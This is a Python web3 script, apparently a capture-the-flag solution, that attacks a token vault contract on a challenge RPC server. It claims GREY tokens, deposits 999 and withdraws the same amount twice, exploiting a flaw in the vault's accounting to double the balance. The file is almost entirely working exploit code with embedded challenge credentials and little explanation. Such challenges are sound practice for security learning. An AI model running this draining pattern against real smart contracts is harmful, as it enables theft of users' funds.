from solcx import compile_source, install_solc, set_solc_version
from web3 import Web3
import os

# Install and set solc version
SOLC_VERSION = '0.8.20'
install_solc(SOLC_VERSION)
set_solc_version(SOLC_VERSION)

# Compilation settings
COMPILATION_SETTINGS = {
    'optimize': True,
    'optimize_runs': 200,
}

# Constants
ETHER = 10**18
AMOUNT = 999 * ETHER

# 문제에서 사용하는 각종 정보 추출
RPC_URL = "http://challs2.nusgreyhats.org:33504/e77810fb-0e4a-4426-a749-2fcf8220f3b4"
USER_PRIV_KEY = "0x61cb29e4e643e915f5f0ebaac8942751a6a5edb8e646708b169cfc14be3655f9"
USER_ADDRESS = "0x7f05ec1BB67Aa5A236E3535a5cc6D390eeBCd713"
SETUP_ADDRESS = "0x33AC095efD10A73B7e75CBeDb503F36813329913"

with open("./Setup.sol", "r") as f:
    SETUP_SRC_DATA = f.read()

with open("./Vault.sol", "r") as f:
    VAULT_SRC_DATA = f.read()

with open("./lib/GREY.sol", "r") as f:
    GREY_SRC_DATA = f.read()

COMPILED_SOL = compile_source(
    SETUP_SRC_DATA,
    output_values=['abi', 'bin'],
    solc_version=SOLC_VERSION,
    **COMPILATION_SETTINGS
)

SETUP_ABI = COMPILED_SOL['<stdin>:Setup']['abi']

COMPILED_SOL = compile_source(
    VAULT_SRC_DATA,
    output_values=['abi', 'bin'],
    solc_version=SOLC_VERSION,
    **COMPILATION_SETTINGS
)

VAULT_ABI = COMPILED_SOL['<stdin>:RationalVault']['abi']

COMPILED_SOL = compile_source(
    GREY_SRC_DATA,
    output_values=['abi', 'bin'],
    solc_version=SOLC_VERSION,
    **COMPILATION_SETTINGS
)

GREY_ABI = COMPILED_SOL['<stdin>:GREY']['abi']

web3 = Web3(Web3.HTTPProvider(RPC_URL))

current_file = os.path.abspath(__file__)

BASE_DIR = os.path.dirname(current_file) + "/dist-rational"
CONTRACT_PATH = "/src/Setup.sol"

setup = web3.eth.contract(address=SETUP_ADDRESS, abi=SETUP_ABI)

print("---- DO ATTACK ----")

# 1. GET Vault address and claim GREY
vault_address = setup.functions.vault().call()

tx = setup.functions.claim().build_transaction({
    "from": USER_ADDRESS,
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

# 2. GET GREY address
grey_address = setup.functions.grey().call()

vault = web3.eth.contract(address=vault_address, abi=VAULT_ABI)
grey = web3.eth.contract(address=grey_address, abi=GREY_ABI)

# 3. GET GREY balance
grey_balance = grey.functions.balanceOf(USER_ADDRESS).call()

print(f"GREY balance: {grey_balance}")

# 5. Deposit 999 GREY to Vault for Attack
tx = vault.functions.deposit(AMOUNT).build_transaction({
    "from": USER_ADDRESS,
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 6. Withdraw 999 GREY from Vault twice
for _ in range(2):
    tx = vault.functions.withdraw(AMOUNT).build_transaction({
        "from": USER_ADDRESS,
        "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
    })

    signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

    print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

    receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Transaction Receipt: {receipt}\n")

# 7. Check User's GREY balance (if is 1998, then attack is successful)
print(f"User's GREY balance: {grey.functions.balanceOf(USER_ADDRESS).call()}")